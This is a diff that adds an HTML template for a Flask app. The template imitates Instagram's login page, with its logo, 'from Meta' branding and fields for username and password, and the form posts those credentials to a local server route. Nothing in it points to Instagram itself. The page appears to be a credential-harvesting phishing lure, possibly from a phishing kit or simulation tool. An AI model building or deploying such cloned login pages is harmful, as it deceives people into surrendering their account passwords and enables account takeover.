@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Instagram</title>
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"
+    />
+    <link rel="stylesheet" href="/static/css/instagram.css" />
+  </head>
+  <body>
+    <div class="login-container">
+      <div class="login-card">
+        <img
+          src="/static/images/instagram.png"
+          alt="Instagram"
+          class="logo"
+        />
+
+        <form
+          class="login-form"
+          id="loginForm"
+          method="post"
+          action="{{ url_for('instagram') }}"
+        >
+          <div class="form-group">
+            <input
+              type="text"
+              class="form-input"
+              placeholder="Phone number, username, or email"
+              id="usernameField"
+              name="username"
+            />
+            <div class="error-message" id="usernameError">
+              Please enter your username or email
+            </div>
+          </div>
+
+          <div class="form-group">
+            <input
+              type="password"
+              class="form-input"
+              placeholder="Password"
+              id="passwordField"
+              name="password"
+            />
+            <span class="password-toggle" id="togglePassword">
+              <i class="fas fa-eye"></i>
+            </span>
+            <div class="error-message" id="passwordError">
+              Please enter your password
+            </div>
+          </div>
+
+          <button type="submit" class="login-btn" value="Log">Log In</button>
+
+          <div class="divider">OR</div>
+
+          <a href="#" class="fb-login">
+            <i class="fab fa-facebook-square"></i> Log in with Facebook
+          </a>
+
+          <a href="#" class="forgot-pw">Forgot password?</a>
+        </form>
+      </div>
+
+      <div class="signup-card">
+        Don't have an account? <a href="#" class="signup-link">Sign up</a>
+      </div>
+
+      <div class="meta-brand">from Meta</div>
+    </div>
+
+    <script src="/static/js/instagram.js"></script>
+  </body>
+</html>
